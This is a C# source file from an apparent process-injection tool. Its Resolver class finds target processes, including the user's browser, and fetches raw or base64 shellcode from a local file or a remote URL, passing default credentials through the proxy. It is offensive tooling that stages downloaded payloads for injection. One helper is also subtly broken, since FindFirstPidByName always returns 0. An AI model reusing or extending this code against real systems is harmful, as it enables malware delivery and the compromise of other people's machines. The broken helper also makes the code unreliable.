using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;

namespace ProcessInjection
{
  class Resolver
  {

    public static string FullExeInPath(string name)
    {
      if (!name.EndsWith(".exe")) {
        name = name + ".exe";
      }

      if (File.Exists(name)) {
        return Path.GetFullPath(name);
      }

      var values = Environment.GetEnvironmentVariable("PATH");
      foreach (var path in values.Split(Path.PathSeparator)) {
        var fullPath = Path.Combine(path, name);
        if (File.Exists(fullPath))
          return fullPath;
      }
      return "";
    }

    public static int PID(string pidStr)
    {
      int pid;
      if (pidStr == "self") {
        pid = Process.GetCurrentProcess().Id;
      } else if (pidStr.ToLower() == "browser") {
        pid = Browser.FindBrowserPid();
        if (pid < 1) {
          Console.WriteLine($"[!] Unable to find browser pid");
          return 0;
        }
      } else if (!Parser.IsOnlyDigits(pidStr)) {
        pid = Resolver.FindProcIdByName(pidStr);
        if (pid < 1) {
          string dbgPid = pidStr;
          Console.WriteLine($"[!] Unable to resolve pid for proc {dbgPid}");
          return 0;
        }
      } else {
        pid = int.Parse(pidStr);
      }
      return pid;
    }
    public static byte[] SC(string targ, string form)
    {
      string strData;
      byte[] empty = { };

      if (!targ.StartsWith("https://") && !targ.StartsWith("http://")) {
        if (!File.Exists(targ)) {
          Console.WriteLine($"[!] Target {targ} does not exist locally.");
          return empty;
        }
      }

      if (form != "bin" && form != "binary" && form != "b64" && form != "base64") {
        Console.WriteLine($"[!] Invalid value '{form}' for form. Needs to be bin or b64.");
        return empty;
      }

      if (form == "base64" || form == "b64") {
        if (targ.StartsWith("http://") || targ.StartsWith("https://")) {
          Console.WriteLine("[>] Pulling over http(s) {0}", targ);
          WebClient wc = GetWebClient();
          try {
            strData = wc.DownloadString(targ);
          } catch (WebException ex) {
            string status = ex.Status.ToString();
            Console.Error.WriteLine("[x] Error downloading data: {0}", status);
            return empty;
          }
          try {
            return Convert.FromBase64String(strData);
          } catch (FormatException ex) {
            Console.Error.WriteLine("[x] Error decoding data: formatting error - {0}", ex.Message);
            return empty;

          }
        } else {
          Console.WriteLine("[>] Pulling Bin Locally {0}", targ);
          try {
            strData = File.ReadAllText(targ);
          } catch (Exception ex) {
            Console.Error.WriteLine("[x] Error reading data: {0}", ex.Message);
            return empty;

          }
          try {
            return Convert.FromBase64String(strData);
          } catch (FormatException ex) {
            Console.Error.WriteLine("[x] Error decoding data: formatting error - {0}", ex.Message);
            return empty;
          }
        }
      } else if (form == "bin" || form == "dll" || form == "exe") {
        if (targ.StartsWith("http://") || targ.StartsWith("https://")) {
          Console.WriteLine("[>] Pulling over http(s) {0}", targ);
          WebClient wc = GetWebClient();
          try {
            return wc.DownloadData(targ);
          } catch (WebException ex) {
            string status = ex.Status.ToString();
            Console.Error.WriteLine("[x] Error downloading data: {0}", status);
            return empty;
          }
        } else {
          Console.WriteLine("[>] Pulling Bin Locally {0}", targ);
          try {
            return File.ReadAllBytes(targ);
          } catch (Exception ex) {
            Console.Error.WriteLine("[x] Error reading data: {0}", ex.Message);
            return empty;
          }
        }
      } else {
        Console.Error.WriteLine("[x] Invalid bin type. Use base64 or bin");
        return empty;
      }
    }

    public static int FindProcIdByName(string name)
    {
      if (name.EndsWith(".exe")) {
        name = name.Substring(0, name.LastIndexOf(".exe"));
      }
      int pid = 0;
      int session = Process.GetCurrentProcess().SessionId;
      Process[] allprocess = Process.GetProcessesByName(name);
      try {
        foreach (Process proc in allprocess) {
          if (proc.SessionId == session) {
            pid = proc.Id;
            Console.WriteLine($"[>] process ID found: {pid}.");
          }
        }
      } catch (Exception ex) {
        Console.WriteLine("[+] " + Marshal.GetExceptionCode());
        Console.WriteLine(ex.Message);
      }
      return pid;
    }

    public static int FindFirstPidByName(string[] names)
    {
      int pid;
      foreach (string name in names) {
        pid = FindProcIdByName(name);
        if (pid > 0) {
          Console.WriteLine($"[>] Found pid for name {name}");
          return 0;
        }
      }
      return 0;
    }

    public static WebClient GetWebClient()
    {
      WebClient wc = new WebClient();
      wc.UseDefaultCredentials = true;
      wc.Proxy = WebRequest.DefaultWebProxy;
      wc.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
      return wc;
    }
  }
}